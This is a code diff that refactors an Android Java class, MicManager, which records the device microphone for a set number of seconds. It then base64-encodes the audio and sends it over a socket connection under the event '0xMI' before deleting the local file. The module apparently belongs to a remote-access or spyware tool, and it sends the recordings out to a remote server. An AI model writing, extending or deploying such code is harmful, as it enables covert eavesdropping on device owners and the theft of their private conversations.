@@ -22,47 +22,46 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+// Microphone recording manager
 public final class MicManager {
 
     private static MediaRecorder recorder;
     private static File audioFile;
     private static final Handler handler = new Handler(Looper.getMainLooper());
-    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
-    private static final AtomicBoolean isRecording = new AtomicBoolean(false);
-    private static Runnable stopRunnable;
+    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
+    private static final AtomicBoolean recording = new AtomicBoolean(false);
+    private static Runnable stopTask;
 
     private MicManager() {}
 
+    // Check if recording
     public static boolean isRecording() {
-        return isRecording.get();
+        return recording.get();
     }
 
-    public static void startRecording(int seconds) {
-        if (seconds <= 0 || seconds > 3600) return; // Max 1 hour
+    // Start recording
+    public static void start(int seconds) {
+        if (seconds <= 0 || seconds > 3600) return;
 
-        // Check permission
         if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
-            sendError("Microphone permission not granted");
+            sendError("No mic permission");
             return;
         }
 
-        // Stop any existing recording
-        stopRecording();
+        stop();
 
-        if (!isRecording.compareAndSet(false, true)) {
-            return; // Already recording
-        }
+        if (!recording.compareAndSet(false, true)) return;
 
-        // Update foreground service type for microphone
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.updateForegroundType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+        // Update service type for Android 14+
+        MainService svc = MainService.getInstance();
+        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         }
 
         try {
             File cache = FasonApp.getContext().getCacheDir();
             if (cache == null) {
-                isRecording.set(false);
+                recording.set(false);
                 return;
             }
 
@@ -78,30 +77,26 @@ public final class MicManager {
             recorder.prepare();
             recorder.start();
 
-            // Schedule stop and send
-            stopRunnable = () -> {
-                stopRecording();
-                sendAudioFile();
+            stopTask = () -> {
+                stop();
+                sendAudio();
             };
-            handler.postDelayed(stopRunnable, seconds * 1000L);
+            handler.postDelayed(stopTask, seconds * 1000L);
 
-            // Send recording started notification
             sendStatus("recording", seconds);
 
         } catch (Exception e) {
-            isRecording.set(false);
+            recording.set(false);
             sendError("Recording failed: " + e.getMessage());
-
-            // Release foreground service type
-            releaseForegroundType();
+            releaseType();
         }
     }
 
-    public static void stopRecording() {
-        // Cancel pending stop
-        if (stopRunnable != null) {
-            handler.removeCallbacks(stopRunnable);
-            stopRunnable = null;
+    // Stop recording
+    public static void stop() {
+        if (stopTask != null) {
+            handler.removeCallbacks(stopTask);
+            stopTask = null;
         }
 
         try {
@@ -112,19 +107,21 @@ public final class MicManager {
             }
         } catch (Exception ignored) {}
 
-        isRecording.set(false);
-        releaseForegroundType();
+        recording.set(false);
+        releaseType();
     }
 
-    private static void releaseForegroundType() {
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.releaseForegroundType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+    // Release service type
+    private static void releaseType() {
+        MainService svc = MainService.getInstance();
+        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         }
     }
 
-    private static void sendAudioFile() {
-        executor.execute(() -> {
+    // Send audio file
+    private static void sendAudio() {
+        exec.execute(() -> {
             try {
                 if (audioFile == null || !audioFile.exists()) {
                     sendError("Audio file not found");
@@ -136,28 +133,26 @@ public final class MicManager {
                     bis.read(data);
                 }
 
-                String base64Audio = Base64.encodeToString(data, Base64.NO_WRAP);
-
                 JSONObject obj = new JSONObject();
                 obj.put("file", true);
                 obj.put("name", audioFile.getName());
-                obj.put("buffer", base64Audio);
+                obj.put("buffer", Base64.encodeToString(data, Base64.NO_WRAP));
                 obj.put("size", data.length);
                 obj.put("timestamp", System.currentTimeMillis());
 
                 SocketClient.getInstance().getSocket().emit("0xMI", obj);
 
-                // Cleanup
                 if (audioFile != null) {
                     audioFile.delete();
                     audioFile = null;
                 }
             } catch (Exception e) {
-                sendError("Failed to send audio: " + e.getMessage());
+                sendError("Send failed: " + e.getMessage());
             }
         });
     }
 
+    // Send status
     private static void sendStatus(String status, int duration) {
         try {
             JSONObject obj = new JSONObject();
@@ -168,6 +163,7 @@ public final class MicManager {
         } catch (Exception ignored) {}
     }
 
+    // Send error
     private static void sendError(String error) {
         try {
             JSONObject obj = new JSONObject();
@@ -176,5 +172,10 @@ public final class MicManager {
             obj.put("timestamp", System.currentTimeMillis());
             SocketClient.getInstance().getSocket().emit("0xMI", obj);
         } catch (Exception ignored) {}
+    }
+
+    // Alias for start
+    public static void startRecording(int seconds) {
+        start(seconds);
     }
 }
